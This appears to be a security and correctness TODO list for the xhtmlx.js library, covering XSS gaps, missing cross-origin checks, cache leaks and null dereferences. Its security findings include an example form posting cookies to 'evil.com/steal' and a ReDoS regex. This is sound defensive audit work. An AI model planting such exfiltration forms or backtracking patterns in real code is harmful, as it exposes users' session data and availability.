# Correctness TODO

## Security

- [x] **XSS: `_applyPlanBindings` skips `sanitizeHtml` for `xh-html`** (`xhtmlx.js:2072-2075`)
  The plan-based fast path sets `el.innerHTML` directly without calling `config.sanitizeHtml`. The regular `applyBindings` path (line 813) does check it. All code paths that set innerHTML from user data must go through the sanitization hook.

- [x] **XSS: `patchBindings` skips `sanitizeHtml` for html ops** (`xhtmlx.js:4528-4529`)
  `el.innerHTML = newVal` in the DOM-patching path bypasses the `config.sanitizeHtml` hook. Same fix needed as above.

- [x] **Missing cross-origin check in `boostForm`** (`xhtmlx.js:3650-3693`)
  `boostLink` validates same-origin before fetching (line 3587-3590), but `boostForm` does not. A form with `action="https://evil.com/steal"` inside an `xh-boost` container will send a fetch with cookies to the cross-origin URL.

- [x] **Missing cross-origin check in `popstateHandler`** (`xhtmlx.js:4920-4950`)
  History state entries pushed by `xh-push-url` contain the API URL. If an attacker can inject a history entry with a crafted `url` field (e.g. via `history.pushState`), `popstateHandler` will `fetch()` an arbitrary URL with cookies.

- [x] **ReDoS risk in `xh-validate-pattern`** (`xhtmlx.js:2818-2823`)
  User-provided regex patterns from the `xh-validate-pattern` attribute are compiled directly via `new RegExp(pattern)`. A malicious pattern like `(a+)+$` can cause catastrophic backtracking. Mitigated by limiting input length to 10000 chars before testing.

## Functional Bugs

- [x] **Failed template fetches are cached forever** (`xhtmlx.js:557-568`)
  `fetchTemplate` caches the promise. If the fetch fails (network error, 404), the rejected promise stays in `templateCache` permanently. All subsequent attempts to load the same template get the stale rejection. On failure the entry should be evicted from the cache.

- [x] **Null dereference in `boostLink`** (`xhtmlx.js:3595-3596`)
  `link.closest("[xh-boost]")` can return `null` if the link was detached or the boost container was removed. The next line `boostContainer.getAttribute(...)` would throw an uncaught `TypeError`.

- [x] **Null dereference in `boostForm`** (`xhtmlx.js:3671`)
  Same issue: `form.closest("[xh-boost]")` can return `null`, leading to a `TypeError` on `boostContainer.getAttribute(...)`.

- [x] **Router and boost use `innerHTML = ""` without CSP-safe check** (`xhtmlx.js:3630,3377,3389,3407`)
  Several places in the router and boost code clear containers with `target.innerHTML = ""` instead of checking `config.cspSafe` and using `while (target.firstChild) target.removeChild(target.firstChild)`. This breaks in strict CSP environments.

- [x] **Router 404 template fetch has no error handler** (`xhtmlx.js:4402-4410`)
  If the 404 template URL itself fails to fetch, the rejected promise is unhandled. Add a `.catch()` handler.

- [x] **`switchVersion` doesn't clear `triggerSpecCache` or `pathSplitCache`** (`xhtmlx.js:4709-4732`)
  When switching UI versions, `templateCache` and `responseCache` are cleared, but `triggerSpecCache` and `pathSplitCache` retain stale entries. If trigger specs or data paths contained version-specific values, they would persist incorrectly.

- [x] **`navigatePath` has no bounds checking** (`xhtmlx.js:1263-1268`)
  If a child element count changes between plan compilation and execution (e.g. due to external DOM mutation), `node.children[path[i]]` returns `undefined` and the next loop iteration throws. Add a null guard.

- [x] **`popstateHandler` silently swallows all errors** (`xhtmlx.js:4942`)
  `.catch(function () {})` discards all fetch errors including network failures. At minimum, log the error in debug mode so developers can diagnose navigation issues.

- [x] **`boostForm` silently swallows JSON parse failures** (`xhtmlx.js:3680`)
  `catch(e) { return; }` discards the error and does nothing, making form submissions silently fail with no feedback to the user or developer.

## Memory Leaks

- [x] **`triggerSpecCache` grows without bound** (`xhtmlx.js:1336`)
  Unlike `pathSplitCache` (has `PATH_SPLIT_CACHE_MAX`), `renderFragmentCache` (has `RENDER_FRAGMENT_CACHE_MAX`), and `responseCache` (has `RESPONSE_CACHE_MAX`), `triggerSpecCache` has no size limit. In SPAs with dynamically generated trigger strings, this grows indefinitely.

- [x] **`validationRegexCache` grows without bound** (`xhtmlx.js:2782`)
  Compiled validation regexes are cached in a plain object with no eviction. If validation patterns are generated dynamically, this leaks.

## Robustness

- [x] **`formDataToObject` doesn't handle `File` inputs** (`xhtmlx.js:1418-1430`)
  When a form contains `<input type="file">`, `FormData.forEach` yields `File` objects. These are serialized to `"[object File]"` by `JSON.stringify` in `buildRequestBody`. Either skip file inputs, or warn, or use `FormData` directly instead of JSON for multipart requests.

- [x] **WebSocket reconnect may accumulate duplicate listeners** (`xhtmlx.js:3510`)
  On auto-reconnect, `setupWebSocket` is called recursively, creating a new `WebSocket` and attaching fresh `message`/`open`/`close`/`error` listeners. The old WebSocket's `close` event is what triggers the reconnect, but if the old WS object isn't fully GC'd, its listeners could still fire. The old `state.ws` should be explicitly nulled and event handlers cleaned up before reconnecting.

- [x] **`destroy()` doesn't clear `pathSplitCache`, `triggerSpecCache`, or `validationRegexCache`** (`xhtmlx.js:4777-4795`)
  These caches survive `destroy()`, so re-initializing the library in an SPA will have stale cache state from the previous lifecycle.
